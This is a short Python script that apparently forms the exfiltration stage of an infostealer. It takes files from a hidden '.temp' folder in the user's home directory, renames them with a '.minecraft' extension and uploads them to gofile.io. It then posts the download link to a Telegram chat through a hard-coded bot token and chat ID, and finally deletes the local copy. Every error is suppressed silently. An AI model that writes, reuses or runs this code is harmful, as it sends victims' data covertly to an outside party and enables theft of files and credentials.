import os
import requests

BOT_TOKEN = '7337910559:AAF3fBlgDrcT9R07QpnqUWQ7_eKmnD_1QMc'
CHAT_ID = '-4238011542'

def change_file_extension(file_path, new_extension):
    try:
        base = os.path.splitext(file_path)[0]
        new_file_path = f"{base}{new_extension}"
        os.rename(file_path, new_file_path)
        return new_file_path
    except Exception as e:
        return None

def upload_file(file_path):
    upload_url = "https://store1.gofile.io/uploadFile"

    files = {
        'file': open(file_path, 'rb')
    }

    try:
        response = requests.post(upload_url, files=files)
        
        if response.status_code != 200:
            return None

        response_data = response.json()

        if response_data['status'] == 'ok':
            download_page = response_data['data']['downloadPage']
            return download_page
    except requests.exceptions.RequestException as e:
        pass
    except requests.exceptions.JSONDecodeError:
        pass
    
    return None

def send_telegram_message(bot_token, chat_id, message):
    try:
        send_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {'chat_id': chat_id, 'text': message}
        requests.post(send_url, data=data)
    except Exception as e:
        pass

def process_file(file_name):
    try:
        user_home_directory = os.path.expanduser("~")
        original_file_path = os.path.join(user_home_directory, '.temp', file_name)
        new_extension = '.minecraft'
        
        new_file_path = change_file_extension(original_file_path, new_extension)
        
        if new_file_path:
            download_link = upload_file(new_file_path)
            if download_link:
                message = f"File uploaded successfully. Download link: {download_link}"
                send_telegram_message(BOT_TOKEN, CHAT_ID, message)
                
                try:
                    os.remove(new_file_path)
                except Exception as e:
                    pass
    except Exception as e:
        pass

